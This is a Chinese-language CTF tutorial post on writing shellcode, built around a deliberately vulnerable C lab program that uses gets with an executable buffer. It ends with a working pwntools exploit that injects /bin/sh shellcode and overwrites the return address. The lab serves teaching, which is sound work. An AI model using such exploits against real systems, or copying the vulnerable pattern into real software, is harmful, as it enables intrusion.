---
title: "Day11－Shellcode"
date: 2024-09-11
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## 前言

從今天開始，內容會變得更加困難。之前的題目可能有留一個後門函式，讓你可以直接開啟 shell，或是使用 `system` 函式來方便後續的操作。然而，現實中基本不會有這種情況，所以我們需要學習更多漏洞利用的方法，才能更符合實際的需求。

## Shellcode

根據之前提到的編譯過程，經過簡化後，最終會變成下圖所示的形式：

![image](/images/iron2024/day11_image1.png)

簡單來說，最後真正執行的部分是機器碼，而這正是本章節要教授的內容：Shellcode。之所以稱為 Shellcode，是因為我們透過編寫 Assembly 程式碼，將參數寫入指定的位置，並最終呼叫 `syscall`，來達成我們的目標，例如開啟 shell 或讀取特定檔案。


## Syscall

`syscall` 即為 System Call，是用來與 Kernel 進行溝通的呼叫。在 CTF 中，常見的有以下兩種：

- `execve("/bin/sh", NULL, NULL)`
- `open`、`read`、`write`

這些可以分別用來啟動 shell 或進行任意的檔案讀寫。這個[網站](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)可以幫助查詢呼叫各種 `syscall` 時應該將各個暫存器設置為什麼值，這與前面提到的 Calling Convention 是相關的。

## 如何編寫 Shellcode？

編寫 Shellcode 有幾種方法，以下是幾個選項：

1. 自己寫 Assembly，並透過 `pwntools` 進行轉換。
2. 從 [shellcode database](https://shell-storm.org/shellcode/index.html) 中找到需要的 Shellcode。
3. 使用 `pwntools` 中的 [shellcraft](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)，記得指定 `context.arch`。

## Lab

查看以下程式原始碼：

```c=
#include<stdio.h>
#include <unistd.h>
#include <sys/mman.h>
char shellcode[0x100];
int main(){
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
    unsigned long addr = (unsigned long)&shellcode & ~0xfff;
    mprotect((void *)addr, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE);
    printf("Give me shellcode: ");
    read(0, shellcode, 0x100);
    printf("Overflow me: ");
    char buffer[0x10];
    gets(buffer);
    printf("Bye!\n");
    return 0;
}
```

使用以下指令進行編譯：

```sh=
gcc src/orw.c -o ./orw/share/orw -fno-stack-protector -no-pie
```

你可以自行嘗試這個題目，或繼續閱讀以下解題步驟。

## Writeup

首先可以看到程式使用了 `gets` 函式，存在 Buffer Overflow 的風險。根據編譯參數可以確認程式關閉了 PIE 與 Canary，此外程式還使用了 `mprotect` 來修改記憶體的權限，將 `shellcode` 變數的記憶體區域設為可讀、可寫、可執行。這意味著，即使程式開啟了 NX 保護，我們仍然可以寫入並執行 Shellcode。這是因為新版本的 OS 在 `.bss` 段僅有讀取權限，因此為了這個 Lab，我們才修改了權限。

基於上述觀察，我們可以整理出兩個重點：

1. 我們可以將 Shellcode 寫入變數中。
2. 由於沒有開啟 PIE，可以透過 `gets` 的 Buffer Overflow 將 Return Address 覆寫為 Shellcode 的位址。

為了達成這些目標我們需要確定幾件事情

1. 如何編寫 Shellcode？
2. 如何找到 `shellcode` 變數的位址？

前面提到我們可以使用 `pwntools` 的 `shellcraft` 產生 Shellcode，但需要注意的是，`shellcraft` 產生的 Shellcode 有時候可能會過長，這時就可能需要使用 `shellcode database` 或自行撰寫短一點的 Shellcode，來符合題目對字元數量的限制。例如，以下的 AMD64 開啟 shell 的 Shellcode 長度為 48 字節，已經足夠應付這道題目。

![image](/images/iron2024/day11_image2.png)

接下來，我們需要確定如何找到 `shellcode` 變數的位址。你可以使用 `objdump` 來查看，但這裡我使用另一個工具 `nm`，它可以顯示檔案的符號資訊。透過執行 `nm ret2sc | grep "shellcode"`，可以輕鬆得知 `shellcode` 的位址為 `0x404080`。

![image](/images/iron2024/day11_image3.png)

到此為止，我們已經掌握了所有獲取 Shell 的關鍵資訊，接下來可以開始撰寫 Exploit。

完整 exploit：
以下是完整的 Exploit 程式碼，我也附上另一個 Shellcode，供讀者測試。

```py=
from pwn import *
context.arch = 'amd64'
#r = process('../ret2sc/share/ret2sc')
r = remote('127.0.0.1', 10003)
shellcode = asm(shellcraft.sh())
#shellcode = b'\31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.sendlineafter(b': ', shellcode)
payload = b'A' * (0x20 + 8) + p64(0x404080)
r.sendlineafter(b': ', payload)
r.recvuntil(b'!\n')
r.interactive()
```

solved！！

![image](/images/iron2024/day11_image4.png)
